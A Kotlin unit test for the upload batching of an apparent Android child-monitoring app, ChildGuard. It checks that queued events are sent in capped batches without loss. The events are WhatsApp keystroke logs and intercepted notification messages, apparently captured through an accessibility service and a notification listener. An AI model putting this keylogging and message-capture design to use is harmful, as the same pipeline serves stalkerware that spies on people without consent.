package com.childguard.app

import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test

/**
 * Feature 1/3 upload pipeline: the app must make progress in bounded chunks on
 * a flaky link, never exceed the batch limit, and never lose a queued event.
 */
class UploadBatchingTest {

    @Before
    fun clearQueues() {
        MonitorService.drainRetry()
        MonitorService.drain()
        ChildGuardAccessibilityService.eventQueue.clear()
        ChildGuardNotificationListener.queue.clear()
    }

    private fun event(n: Int) = JSONObject()
        .put("type", "keylog")
        .put("package", "com.whatsapp")
        .put("data", "event-$n")
        .put("ts", n.toLong())

    @Test
    fun batchesAreBoundedAndLoseNothing() {
        val all = (1..600).map { event(it) }
        MonitorService.requeue(all.take(300))
        ChildGuardAccessibilityService.eventQueue.addAll(all.drop(300))

        val b1 = MonitorService.takeUploadBatch(250)
        val b2 = MonitorService.takeUploadBatch(250)
        val b3 = MonitorService.takeUploadBatch(250)
        val b4 = MonitorService.takeUploadBatch(250)

        assertEquals("first batch is capped", 250, b1.size)
        assertEquals("second batch is capped", 250, b2.size)
        assertEquals("remainder is sent next", 100, b3.size)
        assertTrue("nothing is left behind", b4.isEmpty())

        val sent = (b1 + b2 + b3).map { it.optString("data") }.toSet()
        assertEquals("every queued event is uploaded exactly once", 600, sent.size)
    }

    @Test
    fun retryDrainHonoursItsLimit() {
        MonitorService.requeue((1..5).map { event(it) })
        assertEquals(3, MonitorService.drainRetry(3).size)
        assertEquals(2, MonitorService.drainRetry(10).size)
        assertTrue(MonitorService.drainRetry(10).isEmpty())
    }

    @Test
    fun notificationQueueEventsGetTheDashboardDataField() {
        ChildGuardNotificationListener.queue.add(
            JSONObject()
                .put("type", "notification")
                .put("package", "com.whatsapp")
                .put("combined", "Mom: dinner at 7")
                .put("ts", 1L)
        )

        val batch = MonitorService.takeUploadBatch(10)
        assertEquals(1, batch.size)
        assertEquals("Mom: dinner at 7", batch[0].optString("data"))
    }
}
